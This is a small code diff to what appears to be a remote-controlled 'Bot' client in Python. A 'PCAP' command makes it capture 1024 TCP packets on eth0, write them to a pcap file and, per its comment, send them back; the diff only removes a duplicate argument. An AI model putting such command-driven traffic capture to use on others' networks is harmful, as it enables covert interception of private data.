@@ -69,7 +69,7 @@ class Bot:
 
             if command[0:4] == 'PCAP': # sniff on the traffic and send back a pcap file
                 # get 1024 packets and dump to pcap
-                p = sniff(filter='tcp', iface='eth0', prn=sniff_callback_http, count=1024, prn= lambda x:x.summary)
+                p = sniff(filter='tcp', iface='eth0', count=1024, prn= lambda x:x.summary)
                 wrpcap('http_trans.pcap', p)
 
                 ip = command[:command.find(':')]
